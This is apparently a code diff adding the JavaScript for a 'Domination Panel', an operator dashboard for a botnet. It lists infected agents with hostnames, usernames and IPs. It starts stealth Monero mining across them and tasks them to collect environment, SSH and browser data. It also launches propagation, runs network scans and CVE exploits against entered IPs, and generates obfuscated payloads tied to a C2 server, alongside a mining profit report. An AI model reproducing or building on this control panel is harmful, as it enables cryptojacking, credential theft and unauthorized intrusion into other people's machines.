+  } catch (e) {
+    // Wallet display is optional
+  }
+  
+  try {
+    const agentsResp = await fetch(`${API}/api/global/agents`).then(r => r.json());
+    agents = agentsResp.agents || [];
+    renderAgents();
+    log('success', `Loaded ${agents.length} agents`, 'sys');
+  } catch (e) {
+    log('error', `Agents load failed: ${e.message}`, 'api');
+    agents = [];
+  }
+}
+
+// Render Agents
+function renderAgents() {
+  const list = document.getElementById('agents-list');
+  document.getElementById('agents-count').textContent = agents.length;
+  
+  if (agents.length === 0) {
+    list.innerHTML = '<div style="text-align:center; color:var(--text-muted); padding:20px;">No agents registered</div>';
+    return;
+  }
+  
+  list.innerHTML = agents.slice(0, 30).map(a => {
+    const online = a.last_seen && (Date.now() - new Date(a.last_seen).getTime()) < 300000;
+    const platform = a.platform_type || a.os || 'unknown';
+    const hostname = a.hostname || 'unknown';
+    const ip = a.ip_internal || a.ip_external || '-';
+    const username = a.username || '-';
+    const agentId = a.id || a.agent_id || 'unknown';
+    
+    return `<div class="dom-agent-row" onclick="showAgent('${agentId}')">
+      <div class="dom-agent-main">
+        <div class="dom-agent-dot ${online ? 'online' : 'offline'}"></div>
+        <span class="dom-agent-id">${agentId.substring(0,12)}</span>
+        <span class="dom-agent-platform">${platform}</span>
+      </div>
+      <div class="dom-agent-info">
+        <span>${hostname} (${username})</span>
+        <span>${ip}</span>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// Control Functions
+let operationStats = {
+  scanned: 0,
+  detected: 0,
+  bypassed: 0,
+  bypassTotal: 0,
+  exploited: 0,
+  implanted: 0,
+  implantTotal: 0,
+  verified: 0,
+  miningHashrate: 0,
+  collected: 0
+};
+
+async function startAll() {
+  const totalAgents = parseInt(document.getElementById('stat-total')?.textContent || '0');
+  const onlineAgents = parseInt(document.getElementById('stat-online')?.textContent || '0');
+  
+  if (totalAgents === 0) {
+    log('error', '❌ No agents registered!', 'sys');
+    log('info', '💡 Click "Seed Demo Data" to create test agents', 'sys');
+    return;
+  }
+  
+  if (!confirm(`🚀 START ALL OPERATIONS?\n\nAgents: ${totalAgents} total, ${onlineAgents} online\n\nThis will:\n• Start mining on all agents\n• Start data collection\n• Begin propagation`)) return;
+  
+  const btn = document.getElementById('btn-start-all');
+  const status = document.getElementById('start-status');
+  status.textContent = 'STARTING...';
+  btn.style.opacity = '0.7';
+  
+  log('warn', '═══════════════════════════════════════════', 'sys');
+  log('warn', 'STARTING DOMINATION', 'sys');
+  log('warn', '═══════════════════════════════════════════', 'sys');
+  
+  try {
+    // 1. Start mining on all agents
+    log('info', '⛏️ Starting mining operations...', 'sys');
+    const miningResult = await fetch(`${API}/api/mining/start-all`, { method: 'POST' }).then(r => r.json());
+    log('success', `   → Mining started on ${miningResult.agents_targeted || 0} agents`, 'sys');
+    
+    // 2. Start data collection on all agents
+    log('info', '📊 Starting data collection...', 'sys');
+    const collectResult = await fetch(`${API}/api/global/agents/task-all`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ task_type: 'collect', payload: { types: ['env', 'ssh', 'browser'] } })
+    }).then(r => r.json());
+    log('success', `   → Collection tasks sent to ${collectResult.agents_targeted || 0} agents`, 'sys');
+    
+    // 3. Start propagation
+    log('info', '🦠 Starting propagation...', 'sys');
+    const propResult = await fetch(`${API}/api/propagation/start`, { method: 'POST' }).then(r => r.json());
+    log('success', `   → Propagation started: ${propResult.agents_targeted || 0} agents`, 'sys');
+    
+    status.textContent = 'ACTIVE';
+    btn.style.opacity = '1';
+    
+    log('success', '═══════════════════════════════════════════', 'sys');
+    log('success', '✅ ALL OPERATIONS STARTED', 'sys');
+    log('success', `   Agents: ${totalAgents}`, 'sys');
+    log('success', `   Mining: Active`, 'sys');
+    log('success', `   Collection: Active`, 'sys');
+    log('success', '═══════════════════════════════════════════', 'sys');
+    
+    // Reload stats
+    loadAll();
+    
+  } catch (e) {
+    log('error', `Operation failed: ${e.message}`, 'sys');
+    status.textContent = 'ERROR';
+    btn.style.opacity = '1';
+  }
+}
+
+async function simulatePhase(type, label, value, total = null) {
+  return new Promise(resolve => {
+    setTimeout(() => {
+      operationStats[type] = value;
+      const display = total ? `${value} / ${total}` : `${value} ${label}`;
+      updateProgress(type, display, true);
+      log('success', `   → ${display}`, 'sys');
+      resolve();
+    }, 500);
+  });
+}
+
+function updateProgress(type, value, active = false) {
+  const valEl = document.getElementById(`val-${type}`);
+  const indEl = document.getElementById(`ind-${type}`);
+  if (valEl) valEl.textContent = value;
+  if (indEl) indEl.className = `dom-system-indicator ${active ? 'active' : ''}`;
+}
+
+// Load REAL statistics from API
+async function loadRealStats() {
+  try {
+    const resp = await fetch(`${API}/api/domination/real-stats`);
+    const data = await resp.json();
+    
+    if (data.status === 'ok' && data.real_data) {
+      const r = data.real_data;
+      
+      // Update real stats display
+      document.getElementById('real-agents').textContent = r.agents?.total?.toLocaleString() || '0';
+      document.getElementById('real-online').textContent = r.agents?.online?.toLocaleString() || '0';
+      document.getElementById('real-hashrate').textContent = `${(r.mining?.total_hashrate || 0).toLocaleString()} H/s`;
+      document.getElementById('real-miners').textContent = r.mining?.miners?.toLocaleString() || '0';
+      document.getElementById('real-tasks').textContent = r.tasks?.completed?.toLocaleString() || '0';
+      document.getElementById('real-data').textContent = r.data_collection?.records?.toLocaleString() || '0';
+      
+      // Also update stat-total and stat-online for startAll()
+      const totalEl = document.getElementById('stat-total');
+      const onlineEl = document.getElementById('stat-online');
+      if (totalEl) totalEl.textContent = r.agents?.total || '0';
+      if (onlineEl) onlineEl.textContent = r.agents?.online || '0';
+    }
+    
+    // Load profit report
+    const profitResp = await fetch(`${API}/api/domination/profit-report`);
+    const profitData = await profitResp.json();
+    
+    if (profitData.status === 'ok' && profitData.profit) {
+      const p = profitData.profit;
+      document.getElementById('real-daily-xmr').textContent = `${p.mining?.estimated_daily_xmr || 0} XMR`;
+      document.getElementById('real-monthly-usd').textContent = `$${p.mining?.estimated_monthly_usd || 0}`;
+    }
+  } catch (e) {
+    console.error('Failed to load real stats:', e);
+  }
+}
+
+// Load stats every 5 seconds
+setInterval(loadRealStats, 5000);
+loadRealStats(); // Initial load
+
+// Load CVE database
+async function loadCVEs() {
+  try {
+    const resp = await fetch(`${API}/api/exploitation/cves`);
+    const data = await resp.json();
+    
+    if (data.status === 'ok' && data.cves) {
+      const list = document.getElementById('cve-list');
+      list.innerHTML = data.cves.map(cve => `
+        <div style="padding:5px; border-bottom:1px solid var(--border); cursor:pointer;" onclick="exploitCVE('${cve.id}')">
+          <span style="color:${cve.severity === 'critical' ? '#ff4444' : cve.severity === 'high' ? '#ffaa00' : '#00aaaa'};">${cve.id}</span>
+          <span style="color:var(--text-muted);"> - ${cve.name}</span>
+          <span style="color:var(--text); font-size:10px; display:block;">Target: ${cve.target}</span>
+        </div>
+      `).join('');
+    }
+  } catch (e) {
+    console.error('Failed to load CVEs:', e);
+  }
+}
+loadCVEs();
+
+// Start exploitation campaign
+async function startExploitation() {
+  const network = prompt('Enter target network (CIDR):', '192.168.1.0/24');
+  if (!network) return;
+  
+  log('warn', `💥 Starting exploitation: ${network}`, 'exploitation');
+  
+  try {
+    const resp = await fetch(`${API}/api/exploitation/scan`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ network })
+    });
+    const data = await resp.json();
+    
+    if (data.status === 'ok') {
+      log('info', `🔍 Scan initiated: ${network}`, 'exploitation');
+      document.getElementById('exploit-scanned').textContent = 'Scanning...';
+    }
+  } catch (e) {
+    log('error', 'Exploitation failed: ' + e.message, 'exploitation');
+  }
+}
+
+// Exploit specific CVE
+async function exploitCVE(cveId) {
+  const target = prompt('Enter target IP:');
+  if (!target) return;
+  
+  log('warn', `💥 Exploiting ${target} with ${cveId}`, 'exploitation');
+  
+  try {
+    const resp = await fetch(`${API}/api/exploitation/exploit`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, cve: cveId })
+    });
+    const data = await resp.json();
+    
+    if (data.status === 'ok') {
+      log('success', `✅ Exploit sent to ${target}`, 'exploitation');
+    }
+  } catch (e) {
+    log('error', 'Exploit failed: ' + e.message, 'exploitation');
+  }
+}
+
+// Generate payload
+async function generatePayload(type) {
+  log('info', `📦 Generating ${type} payload...`, 'payloads');
+  
+  try {
+    const resp = await fetch(`${API}/api/payloads/generate`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type, obfuscate: true })
+    });
+    const data = await resp.json();
+    
+    if (data.status === 'ok') {
+      // Show payload in modal or copy to clipboard
+      const payload = data.payload;
+      
+      // Create temporary textarea for copy
+      const ta = document.createElement('textarea');
+      ta.value = payload;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      
+      log('success', `✅ ${type} payload copied to clipboard`, 'payloads');
+      log('info', `C2: ${data.c2_server}`, 'payloads');
+    }
+  } catch (e) {
+    log('error', 'Payload generation failed: ' + e.message, 'payloads');
+  }
+}
+
+// Show all payloads
+async function showPayloads() {
+  try {
+    const resp = await fetch(`${API}/api/payloads/list`);
+    const data = await resp.json();
+    
+    if (data.status === 'ok' && data.payloads) {
+      const list = data.payloads.map(p => `• ${p.name} (${p.platform})`).join('\n');
+      alert(`Available Payloads:\n\n${list}`);
+    }
+  } catch (e) {
+    log('error', 'Failed to list payloads', 'payloads');
+  }
+}
+
+// Start propagation
+async function startPropagation() {
+  if (!confirm('🦠 Start propagation to all agents?')) return;
+  
+  log('warn', '🦠 Initiating global propagation...', 'propagation');
+  
+  try {
+    const resp = await fetch(`${API}/api/propagation/start`, { method: 'POST' });
+    const data = await resp.json();
+    
+    if (data.status === 'ok') {
+      log('success', `✅ Propagation started: ${data.agents_tasked} agents tasked`, 'propagation');
+      document.getElementById('prop-attempts').textContent = data.agents_tasked;
+    }
+  } catch (e) {
+    log('error', 'Propagation failed: ' + e.message, 'propagation');
+  }
+}
+
+// Load propagation status
+async function loadPropagationStatus() {
+  try {
+    const resp = await fetch(`${API}/api/propagation/status`);
+    const data = await resp.json();
+    
+    if (data.status === 'ok' && data.propagation) {
+      const p = data.propagation;
+      document.getElementById('prop-attempts').textContent = p.total_tasks || 0;
+      document.getElementById('prop-success').textContent = p.completed || 0;
+      document.getElementById('prop-new-agents').textContent = p.new_agents_24h || 0;
+    }
+  } catch (e) {}
+}
+setInterval(loadPropagationStatus, 10000);
+loadPropagationStatus();
+
+// Seed demo data
+async function seedDemoData() {
+  if (!confirm('🧪 Seed demo data?\n\nThis will add sample agents and tasks for testing.')) return;
+  
+  log('info', '📊 Seeding demo data...', 'demo');
+  
+  try {
+    const resp = await fetch(`${API}/api/demo/seed`, { method: 'POST' });
+    const data = await resp.json();
+    
+    if (data.status === 'ok') {
+      log('success', `✅ Created ${data.agents_created} agents, ${data.tasks_created} tasks`, 'demo');
+      loadAll();
+    }
+  } catch (e) {
+    log('error', 'Demo seed failed: ' + e.message, 'demo');
+  }
+}
+
+async function stopAll() {
+  if (!confirm('⏹️ STOP ALL OPERATIONS?\n\nThis will halt:\n• Mining\n• Propagation\n• Data collection')) return;
+  
+  log('warn', '═══════════════════════════════════════════', 'sys');
+  log('warn', 'STOPPING ALL OPERATIONS', 'sys');
+  log('warn', '═══════════════════════════════════════════', 'sys');
+  
+  const btn = document.getElementById('btn-start-all');
+  const status = document.getElementById('start-status');
+  
+  try {
+    // 1. Stop mining
+    log('info', '⏹️ Stopping mining...', 'sys');
+    const miningStop = await fetch(`${API}/api/mining/stop-all`, { method: 'POST' }).then(r => r.json());
+    log('success', `   → Mining stopped on ${miningStop.agents_stopped || 0} agents`, 'sys');
+    
+    // 2. Stop propagation
+    log('info', '⏹️ Stopping propagation...', 'sys');
+    await fetch(`${API}/api/propagation/stop`, { method: 'POST' });
+    log('success', '   → Propagation stopped', 'sys');
+    
+    status.textContent = 'READY';
+    btn.style.opacity = '1';
+    
+    log('success', '═══════════════════════════════════════════', 'sys');
+    log('success', '✅ ALL OPERATIONS STOPPED', 'sys');
+    log('success', '═══════════════════════════════════════════', 'sys');
+    
+    // Reload stats
+    loadAll();
+    
+  } catch (e) {
+    log('error', `Stop failed: ${e.message}`, 'sys');
+  }
+}
+
+// Utilities
+function setButtonStatus(btn, status) {
+  document.getElementById(`${btn}-status`).textContent = status;
+}
+
+function setSystemStatus(sys, on, value) {
+  const ind = document.getElementById(`ind-${sys}`);
+  const val = document.getElementById(`val-${sys}`);
+  if (ind) ind.className = `dom-system-indicator ${on ? 'on' : 'off'}`;
+  if (val) val.textContent = value;
+}
+
+function setProgress(pct) {
+  document.getElementById('progress').style.width = pct + '%';
+}
+
+// Log System
+let logCounts = { info: 0, success: 0, error: 0, warn: 0, ws: 0, api: 0 };
+let currentFilter = 'all';
+let logHistory = [];
+
+function log(type, msg, source = 'sys') {
+  const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+  const logEl = document.getElementById('debug-log');
+  
+  logHistory.push({ time, type, msg, source });
+  
+  if (logCounts[type] !== undefined) {
+    logCounts[type]++;
+    const counter = document.getElementById(`log-${type}`);
+    if (counter) counter.textContent = logCounts[type];
+  }
+  
+  const line = document.createElement('div');
+  line.className = `dom-log-line ${currentFilter !== 'all' && type !== currentFilter ? 'hidden' : ''}`;
+  line.dataset.type = type;
+  line.innerHTML = `
+    <span class="dom-log-time">${time}</span>
+    <span class="dom-log-source ${source}">${source.toUpperCase()}</span>
+    <span class="dom-log-type ${type}">${type.toUpperCase()}</span>
+    <span class="dom-log-msg">${msg}</span>
+  `;
+  logEl.appendChild(line);
+  
+  while (logEl.children.length > 200) logEl.removeChild(logEl.firstChild);
+  while (logHistory.length > 500) logHistory.shift();
+}
+
+function filterLog(type) {
+  currentFilter = type;
+  document.querySelectorAll('.log-filter-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.dataset.type === type);
+  });
+  document.querySelectorAll('.dom-log-line').forEach(line => {
+    line.classList.toggle('hidden', type !== 'all' && line.dataset.type !== type);
+  });
+}
+
+function clearLog() {
+  logCounts = { info: 0, success: 0, error: 0, warn: 0, ws: 0, api: 0 };
+  logHistory = [];
+  document.querySelectorAll('.log-stat span').forEach(s => s.textContent = '0');
+  document.getElementById('debug-log').innerHTML = '<div class="dom-log-line"><span class="dom-log-time">--:--:--</span><span class="dom-log-source sys">SYS</span><span class="dom-log-type info">CLEAR</span><span class="dom-log-msg">Log cleared</span></div>';
+}
+
+function exportLog() {
+  const content = logHistory.map(l => `[${l.time}] [${l.source.toUpperCase()}] [${l.type.toUpperCase()}] ${l.msg}`).join('\n');
+  const blob = new Blob([content], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `domination_log_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+  URL.revokeObjectURL(url);
+  log('success', 'Log exported', 'sys');
+}
+
+function showAgent(id) {
+  const a = agents.find(x => (x.id || x.agent_id) === id);
+  if (!a) return;
+  
+  const agentId = a.id || a.agent_id;
+  log('info', `Viewing agent: ${agentId?.substring(0,12)}...`, 'sys');
+  document.getElementById('modal-title').textContent = `Agent ${agentId?.substring(0,12)}...`;
+  document.getElementById('modal-input').dataset.agentId = id;
+  document.getElementById('modal').classList.add('active');
+}
+
+async function executeModal() {
+  const select = document.getElementById('modal-select');
+  const input = document.getElementById('modal-input');
+  const agentId = input.dataset.agentId;
+  const taskType = select.value;
+  const payload = input.value;
+  
+  if (!agentId) { log('error', 'No agent selected', 'sys'); return; }
+  
+  log('info', `Sending ${taskType} to agent ${agentId?.substring(0,8)}...`, 'sys');
+  
+  try {
+    const resp = await fetch(`${API}/api/global/agents/${agentId}/task`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ task_type: taskType, payload: payload })
+    });
+    const data = await resp.json();
+    
+    if (resp.ok) log('success', `Task ${taskType} sent to ${agentId?.substring(0,8)}...`, 'api');
+    else throw new Error(data.error || 'Failed');
+  } catch (e) {
+    log('error', `Task failed: ${e.message}`, 'sys');
+  }
+  
+  closeModal();
+}
+
+function closeModal() { document.getElementById('modal').classList.remove('active'); }
+
+function formatHashrate(h) {
+  if (!h || h < 1) return '0';
+  if (h >= 1000000) return (h / 1000000).toFixed(2) + ' MH/s';
+  if (h >= 1000) return (h / 1000).toFixed(2) + ' KH/s';
+  return h.toFixed(0) + ' H/s';
+}
+
+async function updateMiningStatus() {
+  if (!miningActive) return;
+  try {
+    const resp = await fetch(`${API}/api/mining/stealth/status`);
+    const data = await resp.json();
+    if (data.active_agents > 0) {
+      lastHashrate = data.total_hashrate || lastHashrate;
+      document.getElementById('stat-hashrate').textContent = formatHashrate(lastHashrate);
+      document.getElementById('stat-mining').textContent = data.active_agents;
+      setSystemStatus('mining-sys', true, `${data.active_agents} active`);
+    }
+  } catch (e) {}
+}
+
+console.log('%c🌍 Domination Panel Loaded', 'color: #00d2ff; font-size: 14px; font-weight: bold;');
+</script>
+{% endblock %}
